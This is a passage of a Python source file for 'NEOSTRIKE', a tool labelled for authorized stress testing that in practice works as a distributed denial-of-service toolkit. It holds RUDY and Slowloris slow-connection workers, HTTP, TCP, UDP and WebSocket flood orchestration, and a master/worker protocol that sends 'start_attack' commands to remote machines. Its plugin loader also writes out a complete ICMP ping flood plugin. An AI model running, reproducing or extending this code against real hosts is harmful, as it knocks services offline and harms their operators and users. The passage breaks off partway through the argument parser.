                    stats.record(True, "RUDY", 1, note="RUDY chunk sent")
                except OSError:
                    break
                time.sleep(RUDY_POST_INTERVAL)

            s.close()
            logger.info("RUDY target=%s:%s held for %.1fs", target.host, port, RUDY_CONNECT_TIMEOUT)
        except (socket.timeout, ConnectionRefusedError, OSError) as exc:
            stats.record(False, "CONN_ERR", note="rudy-err")
            logger.warning("RUDY target=%s:%s error=%s", target.host, port, exc)
        except Exception as exc:
            stats.record(False, "UNKNOWN", note="exception")
            logger.exception("RUDY unexpected: %s", exc)
        finally:
            with stats.lock:
                stats.active -= 1


# =============================================================================
#  DASHBOARD RENDERING
# =============================================================================

def make_layout() -> Layout:
    layout = Layout(name="root")
    layout.split_column(
        Layout(name="header", size=8),
        Layout(name="body", ratio=1),
        Layout(name="progress", size=4),
        Layout(name="footer", size=3),
    )
    layout["body"].split_row(
        Layout(name="left", ratio=1),
        Layout(name="center", ratio=1),
        Layout(name="right", ratio=1),
    )
    return layout


def render_header(cfg: TestConfig) -> Panel:
    art = Text(BANNER.strip("\n"), style="ns.purple")
    line = Text()
    line.append("  TARGETS ", style="ns.label")
    target_str = ", ".join(
        ti.url or f"{ti.host}:{ti.port}" for ti in cfg.targets[:5]
    )
    if len(cfg.targets) > 5:
        target_str += f" +{len(cfg.targets)-5} more"
    line.append(target_str, style="ns.value")
    line.append("    MODE ", style="ns.label")
    line.append(cfg.method, style="ns.pink")
    if cfg.http_path != "/":
        line.append("    PATH ", style="ns.label")
        line.append(cfg.http_path, style="ns.cyan")
    grp = Group(Align.center(art), Align.center(line))
    return Panel(grp, border_style=ELECTRIC_PURPLE, style=f"on {DEEP_BLACK}")


def render_telemetry(cfg: TestConfig, stats: Stats) -> Panel:
    cur = stats.current_rps()
    avg = stats.avg_rps()
    err_ratio = (stats.errors / stats.completed * 100) if stats.completed else 0.0
    load = min(100.0, err_ratio * 1.5 + (cfg.concurrency / MAX_CONCURRENCY) * 30
               + (1 if cur < avg * 0.6 and stats.completed > 50 else 0) * 30)

    t = Table.grid(padding=(0, 1))
    t.add_column(style="ns.label", justify="right")
    t.add_column(style="ns.value")
    t.add_row("Sent", f"{stats.sent:,}")
    t.add_row("Completed", f"{stats.completed:,}")
    t.add_row("Errors", f"[ns.bad]{stats.errors:,}[/]")
    t.add_row("Current r/s", f"[ns.green]{cur:,.1f}[/]")
    t.add_row("Average r/s", f"{avg:,.1f}")
    t.add_row("Active", f"{stats.active:,}")
    t.add_row("Data recv", _fmt_bytes(stats.bytes_recv))
    t.add_row("Elapsed", _fmt_time(stats.elapsed))
    t.add_row("Est. load", _load_bar(load))
    return Panel(t, title="[ns.cyan]TELEMETRY[/]", border_style=NEON_CYAN)


def render_responses(stats: Stats) -> Panel:
    t = Table(box=None, expand=True)
    t.add_column("Code", style="ns.cyan")
    t.add_column("Count", justify="right", style="ns.pink")
    with stats.lock:
        all_codes = list(stats.status_counts.items()) + list(stats.error_counts.items())
    if not all_codes:
        t.add_row("[ns.dim]-[/]", "[ns.dim]waiting[/]")
    else:
        for code, n in sorted(all_codes, key=lambda kv: -kv[1])[:14]:
            style = "ns.ok" if code.isdigit() and int(code) < 400 else "ns.bad"
            t.add_row(f"[{style}]{code}[/]", f"{n:,}")
    return Panel(t, title="[ns.cyan]RESPONSES[/]", border_style=HOT_PINK)


def render_feed(stats: Stats) -> Panel:
    lines = Text()
    with stats.lock:
        feed = list(stats.feed)
    if not feed:
        lines.append("awaiting traffic...", style="ns.dim")
    for ts, ok, note in reversed(feed):
        marker = ">" if ok else "x"
        style = "ns.green" if ok else "ns.bad"
        stamp = datetime.now().strftime("%H:%M:%S")
        lines.append(f"{marker} ", style=style)
        lines.append(f"[{stamp}] ", style="ns.dim")
        lines.append(f"{note}\n", style="ns.cyan" if ok else "ns.pink")
    return Panel(lines, title="[ns.cyan]LIVE FEED[/]", border_style=ELECTRIC_PURPLE)


def render_progress(cfg: TestConfig, stats: Stats) -> Panel:
    bars = Text()
    if cfg.duration_s:
        frac = min(1.0, stats.elapsed / cfg.duration_s)
        bars.append("Duration  ", style="ns.label")
        bars.append(_mini_bar(frac) + f"  {stats.elapsed:.0f}/{cfg.duration_s:.0f}s\n",
                    style="ns.cyan")
    if cfg.request_target:
        frac = min(1.0, stats.sent / cfg.request_target)
        bars.append("Requests  ", style="ns.label")
        bars.append(_mini_bar(frac) + f"  {stats.sent:,}/{cfg.request_target:,}\n",
                    style="ns.pink")
    if not cfg.duration_s and not cfg.request_target:
        bars.append("Running until manually stopped ", style="ns.amber")
        bars.append("[inf]", style="ns.pink")
    return Panel(bars, title="[ns.cyan]PROGRESS[/]", border_style=ACID_GREEN)


def render_footer() -> Panel:
    t = Text()
    t.append("  [Q]", style="ns.pink")
    t.append(" stop   ", style="ns.dim")
    t.append("[Ctrl+C]", style="ns.pink")
    t.append(" abort   ", style="ns.dim")
    t.append("NEOSTRIKE", style="ns.purple")
    t.append("  | v2.1 | authorized use only", style="ns.dim")
    return Panel(t, border_style=DIM_GREY)


def _mini_bar(frac: float, width: int = 28) -> str:
    filled = int(frac * width)
    return "#" * filled + "." * (width - filled)


def _load_bar(pct: float, width: int = 14) -> str:
    filled = int(pct / 100 * width)
    color = "ns.green" if pct < 40 else ("ns.amber" if pct < 75 else "ns.bad")
    bar = "#" * filled + "." * (width - filled)
    return f"[{color}]{bar} {pct:4.0f}%[/]"


def _fmt_bytes(n: int) -> str:
    x = float(n)
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if x < 1024:
            return f"{x:.1f}{unit}"
        x /= 1024
    return f"{x:.1f}PB"


def _fmt_time(s: float) -> str:
    s = int(s)
    h, rem = divmod(s, 3600)
    m, sec = divmod(rem, 60)
    return f"{h:02d}:{m:02d}:{sec:02d}"


# =============================================================================
#  ORCHESTRATION
# =============================================================================

async def run_http_test(
    cfg: TestConfig, stats: Stats, stopper: StopController,
    logger: logging.Logger, live: Live, layout: Layout
) -> None:
    limiter = RateLimiter(cfg.rate_cap)
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
    connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=False)

    session_kwargs: dict = dict(
        timeout=timeout, connector=connector, headers=cfg.headers
    )
    if cfg.proxy:
        session_kwargs["proxy"] = cfg.proxy

    async with aiohttp.ClientSession(**session_kwargs) as session:
        workers = [
            asyncio.create_task(
                http_worker(cfg, stats, stopper, limiter, session, logger)
            )
            for _ in range(cfg.concurrency)
        ]
        await _drive_until_done(cfg, stats, stopper, live, layout)
        stopper.request_stop()
        for w in workers:
            w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)


async def run_websocket_test(
    cfg: TestConfig, stats: Stats, stopper: StopController,
    logger: logging.Logger, live: Live, layout: Layout
) -> None:
    limiter = RateLimiter(cfg.rate_cap)

    workers = [
        asyncio.create_task(
            websocket_worker(cfg, stats, stopper, limiter, logger)
        )
        for _ in range(cfg.concurrency)
    ]
    await _drive_until_done(cfg, stats, stopper, live, layout)
    stopper.request_stop()
    for w in workers:
        w.cancel()
    await asyncio.gather(*workers, return_exceptions=True)


def run_raw_test(
    cfg: TestConfig, stats: Stats, stopper: StopController,
    logger: logging.Logger, live: Live, layout: Layout,
    worker_fn=raw_worker,
) -> None:
    threads = [
        threading.Thread(target=worker_fn, args=(cfg, stats, stopper, logger),
                         daemon=True)
        for _ in range(cfg.concurrency)
    ]
    for th in threads:
        th.start()

    while not stopper.stopped:
        _refresh(cfg, stats, live, layout)
        if _limits_reached(cfg, stats):
            break
        time.sleep(1.0 / UI_REFRESH_PER_SEC)
    stopper.request_stop()
    for th in threads:
        th.join(timeout=2.0)


async def _drive_until_done(cfg, stats, stopper, live, layout) -> None:
    while not stopper.stopped:
        _refresh(cfg, stats, live, layout)
        if _limits_reached(cfg, stats):
            return
        await asyncio.sleep(1.0 / UI_REFRESH_PER_SEC)


def _limits_reached(cfg: TestConfig, stats: Stats) -> bool:
    if cfg.duration_s and stats.elapsed >= cfg.duration_s:
        return True
    if cfg.request_target and stats.sent >= cfg.request_target \
            and stats.active == 0:
        return True
    return False


def _refresh(cfg: TestConfig, stats: Stats, live: Live, layout: Layout) -> None:
    layout["header"].update(render_header(cfg))
    layout["left"].update(render_telemetry(cfg, stats))
    layout["center"].update(render_responses(stats))
    layout["right"].update(render_feed(stats))
    layout["progress"].update(render_progress(cfg, stats))
    layout["footer"].update(render_footer())
    live.refresh()


# =============================================================================
#  FINAL SUMMARY
# =============================================================================

def final_summary(cfg: TestConfig, stats: Stats, logger: logging.Logger,
                  log_path: str) -> None:
    elapsed = stats.elapsed
    avg = stats.avg_rps()
    success = stats.completed - stats.errors
    succ_pct = (success / stats.completed * 100) if stats.completed else 0.0

    t = Table(box=None, padding=(0, 2))
    t.add_column("Metric", style="ns.label")
    t.add_column("Result", style="ns.value")
    target_summary = ", ".join(
        ti.url or f"{ti.host}:{ti.port}" for ti in cfg.targets
    )
    t.add_row("Targets", target_summary)
    t.add_row("Mode", cfg.method)
    t.add_row("Concurrency", str(cfg.concurrency))
    t.add_row("Duration", _fmt_time(elapsed))
    t.add_row("Requests sent", f"{stats.sent:,}")
    t.add_row("Completed", f"{stats.completed:,}")
    t.add_row("Successful", f"[ns.ok]{success:,}[/]")
    t.add_row("Errors", f"[ns.bad]{stats.errors:,}[/]")
    t.add_row("Success rate", f"{succ_pct:.1f}%")
    t.add_row("Avg throughput", f"{avg:,.1f} req/s")
    t.add_row("Data received", _fmt_bytes(stats.bytes_recv))
    if cfg.http_path != "/":
        t.add_row("HTTP path", cfg.http_path)

    codes = Table(box=None, padding=(0, 2))
    codes.add_column("Code", style="ns.cyan")
    codes.add_column("Count", style="ns.pink", justify="right")
    for code, n in sorted(
        list(stats.status_counts.items()) + list(stats.error_counts.items()),
        key=lambda kv: -kv[1],
    ):
        codes.add_row(code, f"{n:,}")

    console.print()
    console.print(Panel(t, title="[ns.pink]FINAL SUMMARY[/]",
                        border_style=HOT_PINK))
    if codes.row_count:
        console.print(Panel(codes, title="[ns.cyan]RESPONSE BREAKDOWN[/]",
                            border_style=NEON_CYAN))
    console.print(f"[ns.dim]Structured log written to:[/] [ns.cyan]{log_path}[/]")

    logger.info("=" * 60)
    logger.info("SESSION SUMMARY")
    logger.info("targets=%s mode=%s concurrency=%d",
                target_summary, cfg.method, cfg.concurrency)
    logger.info("duration=%.1fs sent=%d completed=%d success=%d errors=%d",
                elapsed, stats.sent, stats.completed, success, stats.errors)
    logger.info("avg_rps=%.2f success_rate=%.1f%% bytes=%d",
                avg, succ_pct, stats.bytes_recv)
    logger.info("status_codes=%s", dict(stats.status_counts))
    logger.info("errors=%s", dict(stats.error_counts))
    logger.info("=" * 60)


# =============================================================================
#  DISTRIBUTED TESTING (Master/Worker TCP Protocol)
# =============================================================================
#
#  Protocol: JSON messages over TCP (newline-delimited)
#
#  Master -> Worker:
#    {"type": "config", "target": "...", "method": "GET", "threads": 100,
#     "duration": 60, "rate": 1000, "path": "/", "proxy": null}
#    {"type": "start"}
#    {"type": "stop"}
#    {"type": "ping"}
#
#  Worker -> Master:
#    {"type": "ready", "worker_id": "w1", "ip": "1.2.3.4"}
#    {"type": "stats", "sent": 1000, "completed": 950, "errors": 50,
#     "bytes_recv": 1024000, "active": 50, "rps": 1200.0}
#    {"type": "pong"}
#    {"type": "error", "message": "..."}
# =============================================================================

DISTRIBUTED_PORT: int = 9999
DISTRIBUTED_STATS_INTERVAL: float = 1.0


class DistributedMessage:
    @staticmethod
    def encode(msg: dict) -> bytes:
        return json.dumps(msg).encode() + b"\n"

    @staticmethod
    def decode(data: bytes) -> Optional[dict]:
        try:
            return json.loads(data.decode().strip())
        except (json.JSONDecodeError, UnicodeDecodeError):
            return None


class DistributedWorker:
    """Runs on worker machines. Connects to master and executes attacks."""

    def __init__(self, master_host: str, master_port: int = DISTRIBUTED_PORT):
        self.master_host = master_host
        self.master_port = master_port
        self.worker_id = f"w-{socket.gethostname()}-{os.getpid()}"
        self.stats = Stats(started_at=time.monotonic())
        self.stopper = StopController()
        self._running = False

    async def connect(self) -> None:
        console.print(f"[ns.cyan]Connecting to master {self.master_host}:{self.master_port}...[/]")
        reader, writer = await asyncio.open_connection(self.master_host, self.master_port)

        # Send ready message
        ready = DistributedMessage.encode({
            "type": "ready",
            "worker_id": self.worker_id,
            "ip": socket.gethostbyname(socket.gethostname()),
        })
        writer.write(ready)
        await writer.drain()

        console.print(f"[ns.green]Connected to master as {self.worker_id}[/]")

        try:
            while True:
                data = await reader.readline()
                if not data:
                    break
                msg = DistributedMessage.decode(data)
                if msg is None:
                    continue

                msg_type = msg.get("type")
                if msg_type == "config":
                    await self._handle_config(msg)
                elif msg_type == "start":
                    asyncio.create_task(self._run_attack())
                elif msg_type == "stop":
                    self.stopper.request_stop()
                elif msg_type == "ping":
                    writer.write(DistributedMessage.encode({"type": "pong"}))
                    await writer.drain()
        except (asyncio.IncompleteReadError, ConnectionError):
            console.print("[ns.bad]Lost connection to master[/]")
        finally:
            writer.close()

    async def _handle_config(self, msg: dict) -> None:
        target = msg.get("target", "")
        method = msg.get("method", "GET").upper()
        threads = msg.get("threads", 100)
        duration = msg.get("duration", 60)
        rate = msg.get("rate", 1000)
        path = msg.get("path", "/")
        proxy = msg.get("proxy")

        console.print(f"[ns.cyan]Received config: {method} {target} ({threads} threads, {duration}s)[/]")

        # Store config for attack
        self._config = {
            "target": target, "method": method, "threads": threads,
            "duration": duration, "rate": rate, "path": path, "proxy": proxy,
        }

    async def _run_attack(self) -> None:
        cfg_dict = getattr(self, "_config", None)
        if not cfg_dict:
            return

        self.stopper = StopController()
        self.stats = Stats(started_at=time.monotonic())

        try:
            targets = parse_targets(cfg_dict["target"], cfg_dict["method"], cfg_dict["path"])
            headers = dict(DEFAULT_HEADERS)
            headers.update({"X-Worker-ID": self.worker_id})

            cfg = TestConfig(
                targets=targets,
                method=cfg_dict["method"],
                headers=headers,
                concurrency=cfg_dict["threads"],
                duration_s=float(cfg_dict["duration"]),
                request_target=None,
                rate_cap=cfg_dict["rate"],
                proxy=cfg_dict.get("proxy"),
                http_path=cfg_dict["path"],
            )

            if cfg.method in ("TCP", "UDP"):
                run_raw_test(cfg, self.stats, self.stopper, logging.getLogger("worker"), None, None)
            elif cfg.method in ("SLOWLORIS", "RUDY"):
                worker_fn = slowloris_worker if cfg.method == "SLOWLORIS" else rudy_worker
                run_raw_test(cfg, self.stats, self.stopper, logging.getLogger("worker"), None, None, worker_fn=worker_fn)
            elif cfg.method == "WEBSOCKET":
                await run_websocket_test(cfg, self.stats, self.stopper, logging.getLogger("worker"), None, None)
            else:
                await run_http_test(cfg, self.stats, self.stopper, logging.getLogger("worker"), None, None)
        except Exception as exc:
            console.print(f"[ns.bad]Attack error: {exc}[/]")


class DistributedMaster:
    """Runs on master machine. Coordinates workers and aggregates stats."""

    def __init__(self, port: int = DISTRIBUTED_PORT):
        self.port = port
        self.workers: dict[str, dict] = {}
        self._server: Optional[asyncio.AbstractServer] = None
        self._aggregate_stats: Optional[Stats] = None
        self._running = False
        self._config_msg: Optional[dict] = None

    async def start(self) -> None:
        self._server = await asyncio.start_server(
            self._handle_worker, "0.0.0.0", self.port
        )
        console.print(f"[ns.green]Master listening on port {self.port}[/]")
        console.print(f"[ns.cyan]Workers can connect with: python neostrike.py --worker {self._get_ip()}:{self.port}[/]")

        addrs = ", ".join(str(s.getsockname()) for s in self._server.sockets)
        console.print(f"[ns.dim]  Listening on {addrs}[/]")

        async with self._server:
            await self._server.serve_forever()

    def _get_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    async def _handle_worker(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        worker_id = None
        try:
            while True:
                data = await reader.readline()
                if not data:
                    break
                msg = DistributedMessage.decode(data)
                if msg is None:
                    continue

                msg_type = msg.get("type")
                if msg_type == "ready":
                    worker_id = msg.get("worker_id", "unknown")
                    self.workers[worker_id] = {
                        "reader": reader, "writer": writer,
                        "ip": msg.get("ip", "?"), "stats": {},
                    }
                    console.print(f"[ns.green]  + Worker connected: {worker_id} ({msg.get('ip')})[/]")
                elif msg_type == "stats":
                    if worker_id:
                        self.workers[worker_id]["stats"] = msg
                elif msg_type == "pong":
                    pass
        except (asyncio.IncompleteReadError, ConnectionError):
            pass
        finally:
            if worker_id and worker_id in self.workers:
                del self.workers[worker_id]
                console.print(f"[ns.amber]  - Worker disconnected: {worker_id}[/]")
            writer.close()

    async def broadcast(self, msg: dict) -> None:
        encoded = DistributedMessage.encode(msg)
        for wid, wdata in list(self.workers.items()):
            try:
                wdata["writer"].write(encoded)
                await wdata["writer"].drain()
            except (ConnectionError, BrokenPipeError):
                pass

    async def send_config(self, target: str, method: str, threads: int,
                          duration: int, rate: int, path: str = "/",
                          proxy: Optional[str] = None) -> None:
        self._config_msg = {
            "type": "config", "target": target, "method": method,
            "threads": threads, "duration": duration, "rate": rate,
            "path": path, "proxy": proxy,
        }
        await self.broadcast(self._config_msg)

    async def start_attack(self) -> None:
        self._aggregate_stats = Stats(started_at=time.monotonic())
        self._running = True
        await self.broadcast({"type": "start"})

    async def stop_attack(self) -> None:
        self._running = False
        await self.broadcast({"type": "stop"})

    def get_aggregate_stats(self) -> dict:
        total_sent = sum(w["stats"].get("sent", 0) for w in self.workers.values())
        total_completed = sum(w["stats"].get("completed", 0) for w in self.workers.values())
        total_errors = sum(w["stats"].get("errors", 0) for w in self.workers.values())
        total_bytes = sum(w["stats"].get("bytes_recv", 0) for w in self.workers.values())
        total_active = sum(w["stats"].get("active", 0) for w in self.workers.values())
        total_rps = sum(w["stats"].get("rps", 0.0) for w in self.workers.values())
        return {
            "workers": len(self.workers),
            "total_sent": total_sent,
            "total_completed": total_completed,
            "total_errors": total_errors,
            "total_bytes_recv": total_bytes,
            "total_active": total_active,
            "total_rps": round(total_rps, 1),
        }


# =============================================================================
#  WEB DASHBOARD (Embedded HTTP + WebSocket Server)
# =============================================================================

WEB_DASHBOARD_PORT: int = 8888

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>NEOSTRIKE Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050510;color:#fff;font-family:'Segoe UI',system-ui,sans-serif;overflow-x:hidden}
.container{max-width:1200px;margin:0 auto;padding:20px}
h1{font-family:Consolas,monospace;font-size:28px;background:linear-gradient(135deg,#6366f1,#ec4899);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:24px}
.stat{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:20px;text-align:center}
.stat-val{font-family:Consolas,monospace;font-size:32px;font-weight:bold}
.stat-lbl{font-size:12px;color:#666;margin-top:4px}
.purple .stat-val{color:#6366f1}.pink .stat-val{color:#ec4899}.cyan .stat-val{color:#06b6d4}.amber .stat-val{color:#f59e0b}
.chart-wrap{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:20px;margin-bottom:24px}
.chart-title{font-size:14px;color:#888;margin-bottom:12px}
canvas{width:100%;height:200px;border-radius:8px}
.log-box{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:16px;max-height:300px;overflow-y:auto;font-family:Consolas,monospace;font-size:12px;color:#555}
.log-line{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.03)}
.log-ok{color:#00ff41}.log-err{color:#ff2d95}.log-info{color:#00f0ff}
.status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px;vertical-align:middle}
.dot-green{background:#00ff41}.dot-red{background:#ff2d95}.dot-yellow{background:#f59e0b}
#connStatus{margin-bottom:16px;font-size:13px;color:#666}
</style>
</head>
<body>
<div class="container">
<h1>NEOSTRIKE DASHBOARD</h1>
<div id="connStatus"><span class="status-dot dot-yellow"></span>Connecting...</div>
<div class="stats">
<div class="stat purple"><div class="stat-val" id="kPps">0</div><div class="stat-lbl">pkt/s</div></div>
<div class="stat pink"><div class="stat-val" id="kMbps">0</div><div class="stat-lbl">MB/s</div></div>
<div class="stat cyan"><div class="stat-val" id="kConn">0</div><div class="stat-lbl">active</div></div>
<div class="stat amber"><div class="stat-val" id="kErr">0</div><div class="stat-lbl">errors</div></div>
</div>
<div class="chart-wrap">
<div class="chart-title">Bandwidth (MB/s)</div>
<canvas id="chart"></canvas>
</div>
<div class="chart-wrap">
<div class="chart-title">Requests/s</div>
<canvas id="rpsChart"></canvas>
</div>
<div class="log-box" id="logBox"></div>
</div>
<script>
const canvas=document.getElementById('chart');
const ctx=canvas.getContext('2d');
const rpsCanvas=document.getElementById('rpsChart');
const rpsCtx=rpsCanvas.getContext('2d');
const logBox=document.getElementById('logBox');
let bwData=[],rpsData=[];
function resizeCanvas(){canvas.width=canvas.offsetWidth;canvas.height=200;rpsCanvas.width=rpsCanvas.offsetWidth;rpsCanvas.height=200}
window.addEventListener('resize',resizeCanvas);resizeCanvas();
function drawChart(c,x,data,color,maxVal){
if(!data.length)return;
const w=c.width,h=c.height,step=w/(data.length-1);
const mx=maxVal||Math.max(...data,0.01);
x.fillStyle=color.replace('1)','0.15)');x.beginPath();x.moveTo(0,h);
for(let i=0;i<data.length;i++){x.lineTo(i*step,h-(data[i]/mx*(h-10))-5)}
x.lineTo((data.length-1)*step,h);x.closePath();x.fill();
x.strokeStyle=color;x.lineWidth=1.5;x.beginPath();
for(let i=0;i<data.length;i++){const px=i*step,py=h-(data[i]/mx*(h-10))-5;i===0?x.moveTo(px,py):x.lineTo(px,py)}
x.stroke();
}
function update(){
if(!ws||ws.readyState!==1)return;
}
function render(){
drawChart(canvas,ctx,bwData,'rgba(99,102,241,1)');
drawChart(rpsCanvas,rpsCtx,rpsData,'rgba(236,72,153,1)');
requestAnimationFrame(render);
}
render();
let ws;
function connect(){
const proto=location.protocol==='https:'?'wss':'ws';
ws=new WebSocket(proto+'://'+location.host+'/ws');
ws.onopen=()=>{
document.getElementById('connStatus').innerHTML='<span class="status-dot dot-green"></span>Connected';
};
ws.onclose=()=>{
document.getElementById('connStatus').innerHTML='<span class="status-dot dot-red"></span>Disconnected - reconnecting...';
setTimeout(connect,2000);
};
ws.onmessage=e=>{
try{
const d=JSON.parse(e.data);
document.getElementById('kPps').textContent=d.pps>=1000?(d.pps/1000).toFixed(1)+'K':d.pps.toFixed(0);
document.getElementById('kMbps').textContent=d.mbps.toFixed(2);
document.getElementById('kConn').textContent=d.active;
document.getElementById('kErr').textContent=d.errors;
bwData.push(d.mbps);rpsData.push(d.pps);
if(bwData.length>80)bwData.shift();
if(rpsData.length>80)rpsData.shift();
if(d.log){
const el=document.createElement('div');el.className='log-line';
el.textContent='['+d.log.ts+'] '+d.log.msg;
logBox.appendChild(el);logBox.scrollTop=logBox.scrollHeight;
if(logBox.children.length>200)logBox.removeChild(logBox.firstChild);
}
}catch(ex){}
};
}
connect();
</script>
</body>
</html>"""


class WebDashboard:
    """Embedded web server for real-time monitoring."""

    def __init__(self, port: int = WEB_DASHBOARD_PORT):
        self.port = port
        self._app: Optional[object] = None
        self._ws_clients: set = set()
        self._stats_ref: Optional[Stats] = None
        self._task: Optional[asyncio.Task] = None

    async def start(self, stats: Stats) -> None:
        try:
            from aiohttp import web
        except ImportError:
            console.print("[ns.warn]  aiohttp.web not available, dashboard disabled[/]")
            return

        self._stats_ref = stats
        app = web.Application()
        app.router.add_get("/", self._handle_index)
        app.router.add_get("/ws", self._handle_ws)
        app.router.add_get("/api/stats", self._handle_stats_api)

        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, "0.0.0.0", self.port)
        await site.start()

        console.print(f"[ns.green]  + Web dashboard: http://localhost:{self.port}[/]")

        # Start broadcast task
        self._task = asyncio.create_task(self._broadcast_loop())

    async def _handle_index(self, request):
        from aiohttp import web
        return web.Response(text=DASHBOARD_HTML, content_type="text/html")

    async def _handle_ws(self, request):
        from aiohttp import web, WSMsgType
        ws = web.WebSocketResponse()
        await ws.prepare(request)
        self._ws_clients.add(ws)
        try:
            async for msg in ws:
                if msg.type == WSMsgType.ERROR:
                    break
        finally:
            self._ws_clients.discard(ws)
        return ws

    async def _handle_stats_api(self, request):
        from aiohttp import web
        if self._stats_ref:
            return web.json_response(self._stats_ref.to_dict())
        return web.json_response({})

    async def _broadcast_loop(self) -> None:
        from aiohttp import web
        while True:
            if self._stats_ref and self._ws_clients:
                data = {
                    "pps": round(self._stats_ref.current_rps(), 1),
                    "mbps": round(self._stats_ref.bytes_recv / max(0.1, self._stats_ref.elapsed) / 1024 / 1024, 2),
                    "active": self._stats_ref.active,
                    "errors": self._stats_ref.errors,
                    "sent": self._stats_ref.sent,
                    "completed": self._stats_ref.completed,
                }
                dead = set()
                for ws in self._ws_clients:
                    try:
                        await ws.send_json(data)
                    except Exception:
                        dead.add(ws)
                self._ws_clients -= dead
            await asyncio.sleep(0.25)


# =============================================================================
#  PLUGIN SYSTEM (Dynamic Attack Mode Loading)
# =============================================================================

PLUGIN_DIR: str = "plugins"


class PluginManager:
    """Discovers and loads attack mode plugins from the plugins/ directory."""

    def __init__(self, plugin_dir: str = PLUGIN_DIR):
        self.plugin_dir = plugin_dir
        self.plugins: dict[str, dict] = {}

    def discover(self) -> None:
        if not os.path.isdir(self.plugin_dir):
            os.makedirs(self.plugin_dir, exist_ok=True)
            self._create_example_plugin()
            return

        for fname in os.listdir(self.plugin_dir):
            if not fname.endswith(".py") or fname.startswith("_"):
                continue
            fpath = os.path.join(self.plugin_dir, fname)
            try:
                spec = __import__("importlib").util.spec_from_file_location(fname[:-3], fpath)
                mod = __import__("importlib").util.module_from_spec(spec)
                spec.loader.exec_module(mod)

                if hasattr(mod, "PLUGIN_INFO"):
                    info = mod.PLUGIN_INFO
                    name = info.get("name", fname[:-3])
                    self.plugins[name] = {
                        "info": info,
                        "module": mod,
                        "path": fpath,
                    }
                    console.print(f"[ns.green]  + Plugin loaded: {name}[/]")
            except Exception as exc:
                console.print(f"[ns.warn]  x Failed to load {fname}: {exc}[/]")

    def get_worker_fn(self, name: str):
        if name in self.plugins:
            mod = self.plugins[name]["module"]
            if hasattr(mod, "worker_fn"):
                return mod.worker_fn
        return None

    def list_plugins(self) -> None:
        if not self.plugins:
            console.print("[ns.dim]  No plugins found[/]")
            return
        for name, data in self.plugins.items():
            info = data["info"]
            console.print(f"  [ns.cyan]{name}[/] - {info.get('description', 'No description')}")

    def _create_example_plugin(self) -> None:
        example = '''#!/usr/bin/env python3
"""
Example NeoStrike Plugin - ICMP Flood

To create your own plugin:
1. Create a .py file in the plugins/ directory
2. Define PLUGIN_INFO dict with: name, description, methods
3. Implement a worker_fn(cfg, stats, stopper, logger) function
"""

PLUGIN_INFO = {
    "name": "ICMP",
    "description": "ICMP ping flood (requires raw socket / admin)",
    "methods": ["ICMP"],
}

import socket
import random
import time
import struct


def worker_fn(cfg, stats, stopper, logger):
    """ICMP echo request flood worker."""
    icmp_type = 8  # Echo request
    icmp_code = 0

    target_idx = random.randrange(len(cfg.targets))

    while not stopper.stopped:
        target = cfg.targets[target_idx % len(cfg.targets)]
        target_idx += 1
        host = target.ip or target.host

        with stats.lock:
            if cfg.request_target and stats.sent >= cfg.request_target:
                return
            stats.sent += 1
            stats.active += 1

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            # Build ICMP echo request
            ident = random.randint(0, 65535)
            seq = random.randint(0, 65535)
            header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, ident, seq)
            payload = random.randbytes(64)
            checksum = _icmp_checksum(header + payload)
            header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, ident, seq)
            s.sendto(header + payload, (host, 0))
            stats.record(True, "ICMP_OK", len(payload), note="ICMP echo sent")
            s.close()
        except PermissionError:
            stats.record(False, "PERM_ERR", note="need admin/root")
            logger.error("ICMP requires admin privileges")
            return
        except Exception as exc:
            stats.record(False, "ICMP_ERR", note=str(exc))
            logger.error("ICMP error: %s", exc)
        finally:
            with stats.lock:
                stats.active -= 1


def _icmp_checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i + 1] if i + 1 < len(data) else 0)
        s += w
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF
'''
        with open(os.path.join(self.plugin_dir, "example_icmp.py"), "w", encoding="utf-8") as f:
            f.write(example)
        console.print(f"[ns.dim]  Created example plugin at {self.plugin_dir}/example_icmp.py[/]")


# =============================================================================
#  MAIN (UPDATED WITH DISTRIBUTED, WEB DASHBOARD, PLUGINS)
# =============================================================================

def build_arg_parser() -> argparse.ArgumentParser:
    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "TCP", "UDP", "SLOWLORIS", "RUDY", "WEBSOCKET"]

    p = argparse.ArgumentParser(
        prog="neostrike",
        description="NEOSTRIKE - Authorized Stress Testing Console v2.1",
    )
    p.add_argument("--target", "-t", type=str,
                   help="Target(s), comma-separated (host, host:port, or URL)")
    p.add_argument("--mode", "-m", type=str, choices=[m.lower() for m in methods],
                   help="Attack mode (get, post, tcp, udp, slowloris, rudy, websocket)")
    p.add_argument("--threads", "-c", type=int, default=DEFAULT_CONCURRENCY,
                   help=f"Concurrency level (default: {DEFAULT_CONCURRENCY})")
    p.add_argument("--duration", "-d", type=str,
